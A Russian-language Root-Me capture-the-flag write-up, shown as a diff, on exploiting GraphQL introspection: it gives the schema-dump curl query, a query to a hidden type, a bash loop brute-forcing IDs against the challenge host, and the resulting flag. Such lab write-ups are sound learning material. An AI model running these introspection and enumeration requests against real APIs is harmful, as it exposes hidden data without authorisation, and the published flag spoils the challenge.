@@ -1,0 +1,91 @@
+Флаг: RM{1ntr0sp3ct1On_1s_us3ful}
+
+# Root-Me Writeup: GraphQL - Introspection
+
+**Платформа:** [Root-Me](https://www.root-me.org/)  
+**Категория:** Web - Server  
+**Уровень:** ⭐⭐⭐ (3/5)  
+**Автор:** Руслан  
+**Дата решения:** 23.10.2026
+
+---
+
+## 📋 Описание задания
+
+> *Цель: Используйте возможности интроспекции GraphQL, чтобы найти скрытые данные и получить флаг.*
+
+**Задача:** Найти скрытый endpoint GraphQL, изучить его схему с помощью интроспекции и извлечь секретные данные, которые не отображаются в стандартном интерфейсе приложения.
+
+---
+
+## 🧠 Теория: GraphQL Introspection
+
+**GraphQL Introspection** — это встроенная функция GraphQL, которая позволяет клиентам запрашивать информацию о самой схеме API. 
+С помощью специальных полей, начинающихся с двойного подчеркивания (например, `__schema`, `__type`), атакующий может получить:
+- Список всех доступных запросов (`Query`) и мутаций (`Mutation`).
+- Все типы данных и их поля.
+- Обязательные аргументы для каждого поля.
+
+⚠️ **Важно:** В продакшене интроспекция **должна быть отключена**, так как она раскрывает всю внутреннюю структуру API злоумышленникам.
+
+---
+
+## 🔍 Разведка
+
+### 1. Анализ исходного кода
+После запуска челленджа открывается веб-страница с формой выбора страны. Просмотр исходного кода (`Ctrl+U`) или перехват трафика в DevTools (Network) показывает, как фронтенд общается с бэкендом:
+
+```javascript
+fetch('/rocketql', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+    },
+    body: JSON.stringify({ query: '{ rockets(country: "' + country + '") { name, country, is_active } }' })
+})
+
+Ключевые находки:
+Endpoint находится по пути /rocketql (а не стандартный /graphql).
+Используется метод POST с JSON-пейлоадом, содержащим поле query.
+⚔️ Эксплуатация
+Шаг 1: Запрос интроспекции схемы
+Отправляем стандартный запрос интроспекции, чтобы получить все типы и их поля:
+curl -X POST http://challenge01.root-me.org:59077/rocketql \
+-H "Content-Type: application/json" \
+-d '{"query": "{ __schema { types { name fields { name } } } }"}'
+Анализ ответа:
+В полученном JSON мы видим стандартные типы (Rocket, Query, String, Int), но также замечаем подозрительный тип:
+{"name":"IAmNotHere","fields":[{"name":"very_long_id"},{"name":"very_long_value"}]}
+А в корневом запросе Query указано, что IAmNotHere доступен для вызова.
+Шаг 2: Попытка запроса к скрытому полю
+Пытаемся запросить данные из IAmNotHere:
+curl -X POST http://challenge01.root-me.org:59077/rocketql \
+-H "Content-Type: application/json" \
+-d '{"query": "{ IAmNotHere { very_long_id, very_long_value } }"}'
+Ответ сервера (ошибка):
+{"errors":[{"message":"Field \"IAmNotHere\" argument \"very_long_id\" of type \"Int!\" is required, but it was not provided."}]}
+Сервер сообщает, что требуется обязательный аргумент very_long_id типа Int (целое число).
+Шаг 3: Перебор ID и обход троллинга
+Добавляем аргумент и начинаем перебор. При запросе very_long_id: 1 мы получаем:
+{"data":{"IAmNotHere":[{"very_long_id":1,"very_long_value":"n"}]}}
+При переборе с 1 по 14 сервер возвращает буквы, складывающиеся в фразу: nothingherelol. Это классический CTF-троллинг, чтобы заставить атакующего подумать, что данных больше нет.
+Шаг 4: Автоматизация извлечения флага
+Чтобы не вводить ID вручную и не остановиться на пустых ответах между тролль-сообщением и флагом, пишем простой bash-скрипт для перебора от 1 до 100:
+echo "Ищем флаг..."
+for i in {1..100}; do
+  response=$(curl -s -X POST http://challenge01.root-me.org:59077/rocketql \
+    -H "Content-Type: application/json" \
+    -d "{\"query\": \"{ IAmNotHere(very_long_id: $i) { very_long_value } }\"}")
+  
+  char=$(echo "$response" | grep -o '"very_long_value":"[^"]*"' | cut -d'"' -f4)
+  
+  if [ -n "$char" ]; then
+    echo "ID $i: $char"
+  fi
+done
+ID 1: n
+...
+ID 14: l
+ID 17: Congratulations, you can use this flag: RM{1ntr0sp3ct1On_1s_us3ful}
+Флаг: RM{1ntr0sp3ct1On_1s_us3ful}
